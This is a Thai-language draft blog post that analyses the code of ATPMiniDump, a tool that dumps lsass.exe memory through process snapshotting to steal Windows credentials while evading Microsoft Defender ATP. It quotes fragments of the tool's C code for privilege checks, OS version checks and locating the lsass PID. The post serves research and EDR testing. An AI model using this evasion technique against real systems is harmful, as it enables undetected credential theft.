---
title: "Code Note 0x2: ATPMiniDump"
date: 2020-07-28T13:29:50+07:00
author: "P. Boonyakarn"
draft: true
description: "Code Note คือชุดของบล็อกและโพสต์ซึ่งจะนำโค้ดของโปรแกรมจากโครงการโอเพนซอร์สมาทำการวิเคราะห์และทำความเข้าใจ ให้ความหมายและข้อเสนอแนะ โดย Code Note ในฉบับที่ 0x2 จะเป็นการนำโค้ดจากโครงการ ATPMiniDump มาทำการวิเคราะห์และตรวจสอบ โดยจะนำผลลัพธ์ที่ได้ไปใช้ในการทดสอบและประเมินผลกับโซลูชัน Endpoint Detection and Response ต่อไป"
---

> **Code Note** คือชุดของบล็อกและโพสต์ซึ่งจะนำโค้ดจากโครงการโอเพนซอร์สมาทำการวิเคราะห์และทำความเข้าใจ ให้ความหมายและข้อเสนอตามจุดประสงค์ของแต่ละโครงการ

สวัสดีทุกท่านซึ่งเข้ามาอ่าน Code Note 0x2 ในเดือนกรกฎาคม 2020 ครับ 

ในชุดของบล็อก **Code Note** ครั้งที่สองนี้ เราจะมาดูแนวคิดของการโจมตีโปรเซส `lsass.exe` ซึ่งนำไปสู่การได้มาซึ่งข้อมูลสำหรับยืนยันตัวตนในสภาพแวดล้อมซึ่งใช้ระบบปฏิบัติการ Windows, แนวคิดและการทำงานของโปรแกรมซึ่งเป็นที่รู้จักกันดีในการนำแนวคิดเหล่านี้มาอิมพลีเมนต์และใช้งานอย่าง mimikatz และโครงการ ATPMiniDump ซึ่งเป็นโครงการที่นำแนวคิดของ mimikatz มาปรับปรุงเพื่อให้สามารถเข้าถึงข้อมูลสำหรับยืนยันตัวตนได้โดยผ่านการตรวจจับของซอฟต์แวร์อย่าง Microsoft Defender Advanced Threat Protection หรือ Microsoft Defender ATP

เนื่องจากหัวข้อซึ่งเราจะพูดถึงการวันนี้อยู่ในชุดของบล็อก **Code Note** ดังนั้นเราจะพูดถึงแนวคิดและการทำงานซึ่งได้มาจากการอ่านโค้ดของโครงการ ATPMiniDump เป็นสำคัญ ทั้งนี้แนวคิดของการโจมตีและการอิมพลีเมนต์แนวคิดนั้นล้วนแล้วแต่เป็นประเด็นที่น่าสนใจทั้งในมุมของการทำ Red teaming ซึ่งมีเป้าหมายสำคัญในการหลบหลีกการตรวจจับ และในมุมของฝั่ง Defense ซึ่งมีหน้าที่ในการเฝ้าระวังและตรวจหาพฤติกรรมการโจมตีเหล่านี้ให้ได้ ผมจะขอพูดถึงประเด็นเหล่านี้ในอนาคตหากมีโอกาสครับ

หัวข้อซึ่งเราจะพูดถึงในบล็อกมีดังนี้ครับ

- [Project Overview](#project-overview)
- [Project Background](#project-background)
  - [Attacking lsass.exe](#attacking-lsassexe)
  - [About ATPMiniDump](#about-atpminidump)
- [Code Analysis](#code-analysis)
  - [Functions](#functions)
    - [wmain Function](#wmain-function)
    - [GetPID Function](#getpid-function)
    - [IsElevated Function](#iselevated-function)
    - [SetDebugPrivilege Function](#setdebugprivilege-function)
  - [Notes](#notes)
    - [Loading External Function with Function Pointer](#loading-external-function-with-function-pointer)
- [Final Notes](#final-notes)

เครดิตซึ่งทำให้รีเสิร์ชชิ้นนี้เกิดขึ้นได้มีดังนี้ครับ

- โครงการ [ATPMiniDump](https://github.com/b4rtik/ATPMiniDump) โดย Matteo Malvica ซึ่งมีที่มาจากรีเสิร์ชของการพยายามหาวิธีการข้ามผ่านการตรวจจับเมื่อต้องดึงข้อมูลออกมาจากหน่วยความจำของโปรเซส `lsass.exe` ([ดูบล็อกต้นฉบับได้ที่นี่](https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/))
- โครงการ [mimikatz](https://github.com/gentilkiwi/mimikatz) โดย Benjamin Delpy ซึ่งนำแนวคิดเกี่ยวกับความปลอดภัยใน Windows มาอิมพลีเมนต์เป็นโปรแกรมซึ่งสามารถใช้ได้จากทั่งฝังโจมตีและฝั่งป้องกัน
- หนังสือ [A Guide to Kernel Exploitation](https://www.amazon.com/Guide-Kernel-Exploitation-Attacking-Core/dp/1597494860) ที่เข้ามามีส่วนสำคัญในการอธิบายโค้ดและการเรียกใช้งาน Windows API ในระดับของ Kernel
- เว็บไซต์ [Geoff Chappell, Software Analyst](https://www.geoffchappell.com/index.htm) โดย Geoff Chappell ที่ช่วยอธิบายการใช้งาน Windows API ในระดับ Kernel ด้วยรายละเอียดที่มีมากกว่า [Microsoft Docs (MSDN)](https://docs.microsoft.com/en-us/)

# Project Overview

ข้อมูลจาก GitHub แสดงให้เห็นว่าโครงการนี้ถูกพัฒนาโดยใช้ภาษา C ทั้งหมด โดยโครงการนี้มีโครงสร้างของไฟล์และไดเรกทอรีตามแผนภาพด้านล่างครับ

```
.
├── ATPMiniDump
│   ├── ATPMiniDump.c
│   ├── ATPMiniDump.h
│   ├── ATPMiniDump.vcxproj
│   ├── ATPMiniDump.vcxproj.filters
│   ├── ATPMiniDump.vcxproj.user
├── ATPMiniDump.sln
├── LICENSE
└── README.md
```

การตรวจสอบไฟล์แต่ละรายการที่ปรากฎในโครงสร้างของโครงการปรากฎไฟล์ดังนี้

1. ไฟล์ในไดเรกทอรี `ATPMiniDump` เก็บโค้ดหลักของโครงการและไฟล์ประกอบอื่นๆ ได้แก่
   1. ไฟล์ `ATPMiniDump.c` จัดเก็บโค้ดการทำงานหลักของโครงการ
   2. ไฟล์ `ATPMiniDump.h` จัดเก็บการประกาศค่าและตัวแปรเฉพาะในลักษณะต่างๆ
   3. ไฟล์ `ATPMiniDump.vcxproj` จัดเก็บรายละเอียดในการ build โครงการสำหรับ Visual Studio
   4. ไฟล์ `ATPMiniDump.vcxproj.filters` จัดเก็บการตั้งค่าของไฟล์ที่จะถูกแสดงใน Visual Studio
2. ไฟล์ ATPMiniDump.sln จัดเก็บข้อมูลการตั้งค่าของ Solution สำหรับ Visual Studio

ในกรณีของการ build ผ่านโปรแกรม `cl.exe` ให้ใช้คำสั่งดังต่อไปนี้

```
cl.exe ATPMiniDump.c Advapi32.lib
```

กระบวนการ build สามารถทำได้ผ่าน Visual Studio เช่นกัน

# Project Background

## Attacking lsass.exe

โปรเซส `lsass.exe` นั้นเป็นโปรเซสของเซอร์วิสของระบบซึ่งมีชื่อเต็มว่า Local Security Authorithy Subsystem Service (LSASS) ซึ่งอิมพลีเมนต์แนวคิด Local Security Authorithy (LSA) เซอร์วิสของระบบเซอร์วิสนี้มีหน้าที่รับผิดชอบสำคัญในการบังคับใช้มาตรการรักษาความปลอดภัยที่กำหนดใดๆ กับระบบ รวมไปถึงมีหน้าในการพิสูจน์ตัวตนผู้ใช้งานทั้งในกรณีที่ผู้ใช้งานทำการเข้าถึงระบบผ่านทางหน้าจอเมื่อเปิดใช้งานระบบ หรือพิสูจน์ตัวตนในช่องทางทางเครือข่ายอื่นๆ เซอร์วิสนี้ยังทำหน้าที่ในการคุมสิทธิ์ในการเข้าถึงทรัพยากรของระบบผ่านการสร้างและจัดการ access token ด้วย (อ้างอิง [Wikipedia](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service))

ด้วยหน้าที่รับผิดชอบสำคัญของเซอร์วิสและโปรเซส `lsass.exe` ที่เกี่ยวข้องกับข้อมูลที่ใช้ในการพิสูจน์ตัวตนของผู้ใช้งาน โปรเซส `lsass.exe` จึงตกเป็นเป้าหมายในการโจมตีหลายรูปแบบ หนึ่งในรูปแบบในการโจมตีต่อโปรเซส `lsass.exe` ซึ่งเป็นที่รู้จักมากที่สุดรูปแบบหนึ่งคือการพยายามเข้าถึงข้อมูลใดๆ ที่โปรเซส `lsass.exe` กำลังประมวลผลอยู่ ค้นหาข้อมูลสำหรับยืนยันตัวตนไม่ว่าจะเป็นรหัสผ่านหรือค่าแฮชที่เก็บอยู่ในหน่วยความจำของโปรเซส และนำค่าหรือข้อมูลดังกล่าวออกมาใช้งาน

หนึ่งในโครงการซึ่งนำแนวคิดของการโจมตีและแสวงหาประโยชน์มาใช้งานและเป็นที่รู้จักอย่างกว้างขวางคือ [mimikatz](https://github.com/gentilkiwi/mimikatz) ซึ่งมีนักพัฒนาหลักคือ Bejamin *gentilkiwi* Delpy โครงการ mimikatz นำแนวคิดของการเข้าถึงโปรเซส `lsass.exe` รวมไปถึงโปรเซสที่เกี่ยวข้องกับการจัดการความปลอดภัยในระบบอื่นๆ เพื่อระบุหาข้อมูลสำหรับยืนยันตัวตนมาทำการอิมพลีเมนต์ให้สามารถใช้งานได้จริง ส่งผลให้ mimikatz กลายเป็นเครื่องมือยอดนิยมในการประเมินความปลอดภัยระบบและยังถูกใช้ในการโจมตีจริงโดย[หลายกลุ่มผู้โจมตี](https://attack.mitre.org/software/S0002/)อีกด้วย

ความนิยมของ mimikatz ในการใช้งานเพื่อโจมตีระบบจริงนั้นส่งผลให้เทคโนโลยีในฝั่งของการตรวจจับและป้องกันภัยคุกคามจำเป็นต้องขยับตาม มีเทคโนโลยีหลายรูปแบบเริ่มอิมพลีเมนต์แนวคิดมากมายภายใต้จุดประสงค์ที่ไม่แตกต่างกันมากนักคือการตรวจจับกิจกรรมใดๆ ในลักษณะที่ผิดปกติกับโปรเซส `lsass.exe` และขัดขวางกิจกรรมดังกล่าวนั้นในกรณีที่สามารถระบุได้จริงว่ากิจกรรมดังกล่าวนั้นมีจุดประสงค์ที่มุ่งร้ายจริง

## About ATPMiniDump

โครงการ ATPMiniDump ถูกพัฒนาออกมาภายใต้จุดประสงค์เพื่อให้โปรแกรม ATPMiniDump สามารถหลบหลีกการตรวจจับโดยเทคโนโลยีในฝั่งของการตรวจจับและป้องกันภัยคุกคามโดยเฉพาะอย่างยิ่ง Microsoft Defender ATP ได้ และยังสามารถทำงานจนบรรลุจุดประสงค์ของมันคือการสร้างไฟล์ที่มีข้อมูลจากหน่วยความจำของโปรเซส `lsass.exe` ได้โดยไม่ถูกขัดขวาง ทั้งนี้วิธีการที่ถูกใช้เพื่อข้ามผ่านการตรวจจับนี้ในปัจจุบันได้ถูกรายงานให้กับทางไมโครซอฟต์เพื่อทำการแก้ไขแล้ว

ในส่วนเริ่มต้นของบล็อก [Evading WinDefender ATP credential-theft: a hit after a hit-and-miss start](https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/) นั้น ผู้พัฒนาโครงการ ATPMiniDump ได้อธิบายถึงสมมติฐานที่น่าสนใจเกี่ยวกับแนวคิดที่ใช้ในการตรวจจับกิจกรรมต้องสงสัยกับโปรเซส `lsass.exe` ว่า Microsoft Defender ATP อาจเฝ้าระวังพฤติกรรมต้องสงสัยโดยการตรวจสอบจำนวนของข้อมูลที่ถูกอ่านผ่านฟังก์ชัน `ReadProcessMemory()` เมื่อมีปลายทางของการเข้าถึงคือโปรเซส lsass.exe

ฟังก์ชัน `ReadProcessMemory()` เป็นฟังก์ชันซึ่งทำให้โปรเซสที่เรียกใช้ฟังก์ชันนี้สามารถคัดลอกข้อมูลซึ่งอยู่ในพื้นที่หน่วยความจำของโปรเซสอื่นในตำแหน่งที่ระบุมาเก็บไว้ในพื้นที่หน่วยความจำของโปรเซสตัวเองได้ ฟังก์ชัน `ReadProcessMemory()` เป็นฟังก์ชันสำคัญซึ่งถูกใช้ใน mimikatz ภายใต้ฟังก์ชัน `kull_m_memory_copy()` ซึ่งจะถูกเรียกใช้อยู่เสมอเมื่อ mimikatz จะทำการเข้าถึงข้อมูลในโปรเซส อาทิ จากฟังก์ชัน `kuhl_m_sekurlsa_getLogonData()`

```cpp
BOOL kull_m_memory_copy(OUT PKULL_M_MEMORY_ADDRESS Destination, 
    IN PKULL_M_MEMORY_ADDRESS Source, IN SIZE_T Length)
{
	...
	switch(Destination->hMemory->type)
	{
	case KULL_M_MEMORY_TYPE_OWN:
		switch(Source->hMemory->type)
		{
		...
		case KULL_M_MEMORY_TYPE_PROCESS:
			status = ReadProcessMemory(
                Source->hMemory->pHandleProcess->hProcess, // hProcess
                Source->address, // lpBaseAddress
                Destination->address, // lpBuffer
                Length, // nSize
                NULL // *lpNumberofBytesRead
            );
			break;
        ...
		}
		break;
    ...
```

โครงการ ATPMiniDump จึงเลือกใช้ฟังก์ชัน `PssCaptureSnapShot()` ซึ่งเป็นฟังก์ชันในการสร้าง snapshot ของโปรเซสแทนฟังก์ชัน `ReadProcessMemory()` การทำ process snapshotting นั้นเป็นกระบวนการในรวบรวมข้อมูลในหน่วยความจำของโปรเซสเพื่อจุดประสงค์ในการสร้างข้อมูล snapshot สำหรับการวิเคราะห์และแก้ไขปัญหาของระบบ ดังนั้นในกรณีของ ATPMiniDump นั้น ฟังก์ชัน `PssCaptureSnapShot()` อาจสามารถเรียกได้ว่าถูกนำมาใช้ในทางที่ผิด (abuse) นั่นเอง

```cpp
DWORD PssCaptureSnapshot(
  HANDLE            ProcessHandle,
  PSS_CAPTURE_FLAGS CaptureFlags,
  DWORD             ThreadContextFlags,
  HPSS              *SnapshotHandle
);
```

บล็อกของผู้พัฒนา ATPMiniDump จะแสดงถึงการวิเคราะห์ฟังก์ชัน `PssCaptureSnapShot()` เพื่อยืนยันว่าฟังก์ชันดังกล่าวสามารถถูกใช้เพื่อนำข้อมูลซึ่งอยู่ในหน่วยความจำของโปรเซสที่ต้องการออกมาด้วย โดยในของโปรเซส `lsass.exe` นั้น ฟังก์ชัน `PssCaptureSnapShot()` สามารถนำข้อมูลในหน่วยความจำรวมไปถึงรหัสผ่านและค่าแฮชซึ่งถูกเก็บไว้ที่สามารถนำเขียนลงไฟล์ได้ทันที จากนั้นไฟล์ซึ่งเก็บข้อมูลนี้ก็จะถูกนำมาวิเคราะห์โดยฟังก์ชัน `sekurlsa::minidump` ของ mimikatz เพื่อนำข้อมูลสำคัญที่ต้องการออกมาได้

# Code Analysis

ในส่วนถัดไป เราจะมาเริ่มการวิเคราะห์โค้ดของโครงการ ATPMiniDump โดยจะอ้างอิงการทำงานของฟังก์ชัน `wmain()` เป็นหลัก ผมจะแยกการทำงานของฟังก์ชันอื่นออกเป็นหัวข้อย่อยเพื่อให้สามารถอ่านได้เพิ่มเติมโดยไม่ขัดจังหวะการอ่านหัวข้อปัจจุบัน และจะมีการเพิ่มโน้ตในอ่านและทำความเข้าใจเป็นหัวข้อย่อยด้วยครับ

## Functions

### wmain Function

> ดูโค้ดของฟังก์ชัน `wmain()` แบบเต็มได้[ที่นี่](https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L122)
> 
> โค้ดในฟังก์ชัน `wmain()` มีการพยายามเรียกใช้ฟังก์ชันซึ่งอยู่ในไลบรารี DLL อื่น แนะนำให้อ่านหัวข้อ [Loading External Function with Function Pointer](#loading-external-function-with-function-pointer) เพิ่มเติมเพื่อความเข้าใจที่มากขึ้นครับ

ฟังก์ชัน `wmain()` เป็นฟังก์ชันที่จะส่งออกข้อมูลประเภทจำนวนเต็มเป็นผลลัพธ์ ฟังก์ชันมีการรับพารามิเตอร์ไว้ตามที่ระบุคือจำนวนของอากิวเมนต์ซึ่งอยู่ในลักษณะจำนวนเต็มด้วยตัวแปร `argc` และรายการของค่าอากิวเมนต์ในรูปแบบอาเรย์ประเภท `wchar_t` ด้วยตัวแปร `argv[]` การตั้งชื่อฟังก์ชันว่า `wmain()` แทนที่จะ `main()` ตามปกตินั้นเป็นไปตามแนวทางของ Unicode programming model ซึ่งสามารถดูรายละเอียดความจำเป็นของการใช้งานได้ที่[เอกสารของไมโครซอฟต์](https://docs.microsoft.com/en-us/cpp/c-language/using-wmain?view=vs-2019)

ฟังก์ชัน `wmain()` สามารถถูกแบ่งลำดับการทำงานออกเป็น 4 ขั้นตอนใหญ่ๆ ได้ตามรายการดังนี้

1. ขั้นตอนของการตรวจสอบสภาพแวดล้อมและเตรียมความพร้อมผ่านการใช้ฟังก์ชัน `IsElevated()` และ `SetDebugPrivilege()`
2. ขั้นตอนของการตรวจสอบรุ่นของระบบปฏิบัติการ เกิดขึ้นหลังจากมีการแสดงข้อความ `[1] Checking OS version details:`
3. ขั้นตอนการตรวจสอบโปรเซสและทำการดึงข้อมูลสำหรับยืนยันตัวออกมาจากโปรเซส `lsass.exe` ด้วยฟังก์ชัน `PssCaptureSnapshot()` เกิดขึ้นหลังจากมีการแสดงข้อความ `[2] Checking Process details:`
4. ขั้นตอนของการสร้างไฟล์ memory dump จากข้อมูลของหน่วยความจำจากขั้นตอนก่อนหน้า เกิดขึ้นหลังจากมีการแสดงข้อความ `[3] create memorydump file:`

ฟังก์ชัน `wmain()` เริ่มต้นการทำงานด้วยการเตรียมความพร้อมในการระบุค่าและตรวจสอบสถานะการตั้งค่าของระบบต่างๆ ตามที่เห็นในโค้ดด้านล่าง

```cpp
if (sizeof(LPVOID) != 8) {
		wprintf(L"[!] Sorry, this tool only works on a x64 version of Windows.\n");
		exit(1);
}

if (!IsElevated()) {
  wprintf(L"[!] You need elevated privileges to run this tool!\n");
  exit(1);
}

SetDebugPrivilege();
```

ขั้นตอนการทำงานแต่ละขั้นตอนสามารถอธิบายได้ตามรายการดังนี้

- ตรวจสอบว่าสถาปัตยกรรมที่โค้ดทำงานอยู่เป็นแบบ 64 บิตหรือไม่ด้วยการเช็คขนาดของประเภทของข้อมูล `LPVOID` โดยหากขนาดของ `LPVOID` ไม่เท่ากับ 8 ไบต์ซึ่งค่าปกติของสถาปัตยกรรมแบบ 64 บิตนั้น ฟังก์ชันจะหยุดการทำงานทันที
- ทำการเรียกใช้ฟังก์ชัน `IsElevated()` เพื่อตรวจสอบว่าโปรแกรมถูกรันด้วยสิทธิ์ที่เพียงพอหรือไม่ การตรวจสอบทำโดยการตรวจสอบ access token ของระบบซึ่งสามารถดูเพิ่มเติมได้ที่หัวข้อของการวิเคราะห์[ฟังก์ชัน `IsElevated()`](#iselevated-function)
- ทำการเรียกใช้ฟังก์ชัน `SetDebugPrivilege()` เพื่อกำหนดสิทธิ์ของโปรเซส `ATPMiniDump.exe` ให้มีสิทธิ์ `SeDebugPrivilege` การกำหนดสิทธิ์สามารถดูเพิ่มเติมได้ที่หัวข้อของการวิเคราะห์[ฟังก์ชัน `SetDebugPrivilege()`](#setdebugprivilege-function)

เมื่อการตรวจสอบเงื่อนไขและตั้งค่าเสร็จสมบูรณ์ ฟังก์ชัน `wmain()` จะเริ่มทำการสร้างตัวแปรใหม่ภายใต้ชื่อ `pWinVerInfo` มีประเภทของตัวแปรเป็น `PWIN_VER_INFO` ตามที่ระบุไว้ในไฟล์ `ATPMiniDump.h` [ในบรรทัดที่ 49](https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.h#L49)

```cpp
typedef struct _WIN_VER_INFO {
	WCHAR chOSMajorMinor[8];
	DWORD dwBuildNumber;
	UNICODE_STRING ProcName;
	HANDLE hTargetPID;
	LPCSTR lpApiCall;
	INT SystemCall;
} WIN_VER_INFO, *PWIN_VER_INFO;
```
จากบทเรียนของเราในเรื่อง typedef (ข้ามไปอ่าน [Loading External Function with Function Pointer](#loading-external-function-with-function-pointer) ได้เพื่อความเข้าใจที่มากขึ้น) เราสามารถอธิบายการโค้ดด้านบนได้ดังนี้

- ทำการสร้างประเภทของข้อมูลใหม่ในชื่อ `_WIN_VER_INFO` จากประเภทข้อมูลแบบ `struct`
- ประเภทข้อมูลนี้จะมีโครงสร้างภายในคือ
  - เก็บค่า `chOSMajorMinor` แบบ wide character ขนาดอาเรย์ 8 ช่อง
  - เก็บค่า `dwBuildNumber` แบบ double word
  - เก็บค่า `ProcName` แบบสตริงที่ใช้ Unicode encoding
  - เก็บค่า `hTargetPID` ในลักษณะของ handle
  - เก็บค่า `lpApiCall` แบบพอยน์เตอร์แบบ 32 บิตซึ่งชี้ไปยังสตริงแบบ constant
  - เก็บค่า `SystemCall` แบบจำนวนเต็ม
- ชื่อของตัวแปรแบบ struct คือ `WIN_VER_INFO`
- ชื่อของพอยน์เตอร์ซึ่งชี้มายัง struct นี้คือ `*PWIN_VER_INFO`

```cpp
PWIN_VER_INFO pWinVerInfo = (PWIN_VER_INFO)calloc(1, sizeof(WIN_VER_INFO));
```

เนื่องจากข้อมูลประเภท `PWIN_VER_INFO` นั้นเป็น pointer ซึ่งชี้ไปยังตำแหน่งในหน่วยความจำที่จะมีการโครงสร้างตามที่ระบุเอาไว้ การสร้างตัวแปร `pWinVerInfo` จึงมีการระบุตำแหน่งของพื้นที่หน่วยความจำซึ่งจองเอาไว้ผ่านการเรียกใช้ฟังก์ชัน `calloc` ซึ่งถูกเรียกใช้เพื่อจองพื้นที่ในหน่วยความจำแบบอาเรย์ที่มีขนาดตามขนาดของ `PWIN_VER_INFO`

หลังจากเสร็จสิ้นการสร้างตัวแปร `pWinVerInfo` โค้ดในส่วนถัดมายังมีการสร้างและกำหนดขนาดของตัวแปรอีกตัวหนึ่งคือ `osInfo` เป็นประเภท `OSVERSIONINFOEX` ซึ่งเป็นประเภทของข้อมูลที่ถูกระบุเอาไว้อยู่แล้วในไฟล์ `Windows.h`

```cpp
OSVERSIONINFOEXW osInfo;
osInfo.dwOSVersionInfoSize = sizeof(osInfo);
```

อ้างอิงจากไมโครซอฟต์ โครงสร้าง `OSVERSIONINFOEXW` เป็นโครงสร้างซึ่งเอามาไว้สำหรับเก็บข้อมูลซึ่งเกี่ยวข้องกับระบบปฏิบัติการ ลักษณะของโครงสร้างสามารถดูได้จากลักษณะของโครงสร้างด้านล่าง

```cpp
typedef struct _OSVERSIONINFOEXW {
  DWORD dwOSVersionInfoSize;
  DWORD dwMajorVersion;
  DWORD dwMinorVersion;
  DWORD dwBuildNumber;
  DWORD dwPlatformId;
  WCHAR szCSDVersion[128];
  WORD  wServicePackMajor;
  WORD  wServicePackMinor;
  WORD  wSuiteMask;
  BYTE  wProductType;
  BYTE  wReserved;
} OSVERSIONINFOEXW, *POSVERSIONINFOEXW, *LPOSVERSIONINFOEXW, RTL_OSVERSIONINFOEXW, *PRTL_OSVERSIONINFOEXW;
```

จากโครงสร้างของ `OSVERSIONINFOEXW` และการกำหนดค่าให้ด้วยโค้ด `osInfo.dwOSVersionInfoSize` ให้มีขนาดตามตัวแปร `osInfo` เป็นการบ่งชี้ว่าตัวแปร `osInfo` มีการถูกตั้งค่าเพื่อที่จะถูกใช้ในส่วนต่อไปในฟังก์ชันนี้

```cpp
_RtlGetVersion RtlGetVersion = (_RtlGetVersion)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
if (RtlGetVersion == NULL) {
  return FALSE;
}

wprintf(L"[1] Checking OS version details:\n");
RtlGetVersion(&osInfo);
```

โค้ดด้านบนแสดงให้เห็นการใช้ตัวแปร `osInfo` ซึ่งถูกสร้างขึ้นมาก่อนหน้า และก็ยังแสดงให้เห็นความพยายามในการใช้ตัวแปรและข้อมูลในตัวแปร `osInfo` เพื่อตรวจสอบรุ่นของระบบปฏิบัติการก่อนที่โปรแกรมจะทำงาน โดยข้อมูลในตัวแปร `osInfo` นั้นมีที่มาจากการเรียกใช้ฟังก์ชัน `RtlGetVersion()` จาก `ntdll.dll` ซึ่งถูกนำเข้ามาประกอบร่างด้วย function pointer เมื่อเสร็จสิ้นการทำงาน ฟังก์ชัน `RtlGetVersion()` จะทำการเก็บข้อมูลตามที่ระบุไว้ในโครงสร้าง `OSVERSIONINFOEXW` ที่ตำแหน่งของตัวแปร `osInfo`

โค้ดในส่วนถัดมาด้านบนคือส่วนของโค้ดซึ่งใช้ตรวจสอบระบบและรุ่นของระบบปฏิบัติการว่ารองรับการทำงานตามเงื่อนไขของโปรแกรมหรือไม่ เนื่องจากระบบและรุ่นของระบบปฏิบัติการหากนับตาม [Release version](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions) จะมีรูปแบบ อาทิ Windows 10 และ Windows Server ในรุ่นที่ถูกปล่อยออกมาพร้อมกับ Windows 10 จะมี Release version คือ 10.0 ส่วน Windows 8.1 และ Windows Server ในรุ่นที่ปล่อยออกมาพร้อมกับ Windows 8.1 จะมี Release version คือ 6.3 โดยข้อมูลที่อยู่หน้าจุดจะเรียกว่า Major version และข้อมูลซึ่งอยู่หลังจุดจะถูกเรียกว่า Minor version ฟังก์ชัน `wmain()` จึงมีการนำค่าทั้งสองส่วนนี้มาประกอบร่างให้สามารถเกิดรูปแบบของ X.X ตามที่ควรจะเป็น

เนื่องจากข้อมูลของระบบของเราอยู่ในตัวแปร `osInfo` และในโครงสร้าง `OSVERSIONEXW` นั้นค่า Major version สามารถหาได้จาก `osInfo.dwMajorVersion` และค่า Minor version สามารถหาได้จาก `osInfo.dwMinorVersion` การประกอบร่างที่เราพูดถึงกันอยู่นี้จึงเป็นการนำค่าในสองส่วนนี้มาเชื่อมกันโดยมีเครื่องหมายจุดคั่นกลาง สำหรับโค้ดในฟังก์ชัน `wmain()` นั้น กระบวนการนี้เกิดขึ้นได้ด้วยการเรียกใช้ฟังก์ชัน `swprintf_s()`

ฟังก์ชัน `swprintf_s()` เป็นฟังก์ชันซึ่งจะทำการคัดลอกข้อมูลที่ต้องการ ทำการจัดรูปแบบและลักษณะ ก่อนจะนำไปเก็บไว้ที่ตำแหน่งปลายที่เราระบุ ซึ่งสามารถอธิบายได้ตามรายละเอียดด้านล่าง

```cpp
swprintf_s(
  pWinVerInfo->chOSMajorMinor,
  _countof(pWinVerInfo->chOSMajorMinor), 
  L"%u.%u", 
  osInfo.dwMajorVersion, 
  osInfo.dwMinorVersion
);
pWinVerInfo->dwBuildNumber = osInfo.dwBuildNumber;
```

- `pWinVerInfo->chOSMajorMinor` คือตำแหน่งปลายที่ข้อมูลจะถูกคัดลอกและจัดรูปแบบไปเก็บเอาไว้
- `_countof(pWinVerInfo->chOSMajorMinor)` คือจำนวนตัวอักษรซึ่งจะจัดเก็บ
- `L"%u.%u"` คือลักษณะของ format string ที่จะทำการมาใช้เป็นแม่แบบในการปรับเปลี่ยนลักษณะของข้อมูลก่อนจะทำการจัดเก็บ ในที่นี้คือการเก็บแบบ unsigned int โดยที่มีเครื่องหมายจุดคั่นกลาง
- `osInfo.dwMajorVersion` และ `osInfo.dwMinorVersion` คือลำดับของอากิวเมนต์ที่จะถูกคัดลอกและเอาไปใส่ไว้ใน `pWinVerInfo->chOSMajorMinor` ด้วยรูปแบบ `L"%u.%u"`

หลังจากกระบวนการคัดลอก จัดรูปแบบและเอาไปใส่ไว้ที่หน่วยความจำปลายทางด้วยฟังก์ชัน `swprintf_s()` แล้ว โค้ดยังมีการกำหนดค่าใน `pWinVerInfo.dwBuildNumber` ให้เป็นค่าตาม `osInfo.dwBuildNumber` ด้วย

```cpp
if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		lpOSVersion = L"10 or Server 2016";
		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
}
else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
  lpOSVersion = L"8.1 or Server 2012 R2";
  wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
}
else {
  wprintf(L"	[!] OS Version not supported.\n\n");
  exit(1);
}
```

เมื่อมีการเตรียมข้อมูลเรียบร้อยแล้ว โค้ดจะเริ่มทำการเปรียบเทียบค่าตามเงื่อนไขเพื่อให้ทำงานต่อไปได้หากมีการทำงานอยู่บนรุ่นระบบปฏิบัติการที่รองรับ และหยุดการทำงานหากมันกำลังทำงานอยู่ในรุ่นของระบบปฏิบัติการที่ไม่รองรับ เราสามารถทำความเข้าใจคร่าวๆ ตามโค้ดด้านบนได้ว่าค่าซึ่งถูกสร้างจากฟังก์ชัน `swprintf_s` คือ `pWinVerInfo.chOSMajorMiner` กำลังถูกนำมาเปรียบเทียบกับ constant value ด้วยฟังก์ชัน `_wcsicmp()` โดยหากรุ่นของระบบปฏิบัติการไม่ได้มี Release version เป็น 6.3 หรือ 10.0 โปรแกรมจะหยุดการทำงาน

หากสภาพแวดล้อมของระบบสอดคล้องกับเงื่อนไขการทำงานของโปรแกรม โปรแกรมจะทำงานต่อในโค้ดส่วนถัดไปและถือเสร็จสิ้นการทำงานในขั้นตอนที่ 2 หรือขั้นตอนของการตรวจสอบรุ่นของระบบปฏิบัติการ และเข้าสู่ขั้นตอนที่ 3 หรือขั้นตอนของการเริ่มเข้าถึงข้อมูลในหน่วยความจำของโปรเซสเพื่อระบุหาข้อมูลสำหรับยืนยันตัวตน

ในขั้นตอนที่ 3 กรบวนการทำงานเริ่มต้นที่การสร้าง function pointer ของฟังก์ชัน `RtlInitUnicodeString()` จาก `ntdll.dll` โดยหน้าที่หลักของฟังก์ชันนี้คือการเปลี่ยนค่าสตริงให้กลายเป็นสตริงแบบ Unicode ฟังก์ชันนี้ทำการเปลี่ยนค่าซึ่งอยู่ในสตริง `lpwProcName` ให้มาเก็บในตำแหน่งของ `pWinVerInfo.ProcName` ในลักษณะของ Unicode

ค่าของตัวแปร `lpwProcName` ถูกกำหนดไว้ในบรรทัด 155 ว่ามีค่าคือ `lsass.exe`

```cpp
_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString) GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
if (RtlInitUnicodeString == NULL) {
  return FALSE;
}

RtlInitUnicodeString(&pWinVerInfo->ProcName, lpwProcName);

if (!GetPID(pWinVerInfo)) {
  wprintf(L"	[!] Enumerating process failed.\n");
  exit(1);
}

wprintf(L"	[+] Process ID of %wZ is: %lld\n", pWinVerInfo->ProcName, (ULONG64)pWinVerInfo->hTargetPID);
```

